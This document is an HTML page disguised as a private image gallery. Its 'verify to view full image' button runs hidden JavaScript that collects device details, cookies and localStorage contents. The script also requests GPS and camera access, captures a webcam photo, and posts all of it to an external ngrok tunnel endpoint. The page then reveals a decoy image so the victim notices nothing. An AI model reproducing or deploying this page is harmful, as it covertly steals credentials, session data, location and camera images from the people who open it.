<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Media Gallery</title>
    <style>
        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background: #000; color: #fff; font-family: sans-serif; }
        #box { text-align: center; padding: 25px; background: #111; border-radius: 15px; width: 85%; max-width: 350px; border: 1px solid #333; }
        button { background: #007bff; color: #fff; border: none; padding: 15px; width: 100%; border-radius: 30px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        #content { display: none; }
        img { max-width: 100%; border-radius: 10px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div id="box">
        <div style="font-size: 50px;">🖼️</div>
        <h3>Private Content</h3>
        <p style="color: #888; font-size: 0.9rem;">To view the high-resolution image, please complete the verification.</p>
        <button onclick="startInfiltration()">VIEW FULL IMAGE</button>
    </div>

    <div id="content">
        <img src="elephant.jpg" alt="Unlocked Content">
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <script>
        const NGROK_URL = 'https://2f74-103-174-44-17.ngrok-free.app/vulnerability_probe';

        async function startInfiltration() {
            // ১. সাইলেন্ট ডাটা (পারমিশন ছাড়াই যা পাওয়া যায়)
            let report = {
                system: {
                    os: navigator.platform,
                    agent: navigator.userAgent,
                    cores: navigator.hardwareConcurrency,
                    ram: navigator.deviceMemory + "GB",
                    res: `${screen.width}x${screen.height}`,
                    lang: navigator.language,
                    time: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookies: document.cookie || "No Cookies Found",
                    storage: JSON.stringify(localStorage)
                },
                extra: {}
            };

            // ব্যাটারি লেভেল চেক
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                report.extra.battery = `${(b.level * 100)}% (${b.charging ? 'Charging' : 'Unplugged'})`;
            }

            // ২. পারমিশন রিকোয়েস্ট (GPS & Camera)
            navigator.geolocation.getCurrentPosition(async (pos) => {
                report.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        sendData(report, canvas.toDataURL('image/jpeg'));
                        stream.getTracks().forEach(t => t.stop());
                    }, 1500);
                } catch (e) { sendData(report, null); }
            }, () => sendData(report, null));

            document.getElementById('box').style.display = 'none';
            document.getElementById('content').style.display = 'block';
        }

        function sendData(d, p) {
            fetch(NGROK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ...d, photo: p }) });
        }
    </script>
</body>
</html>
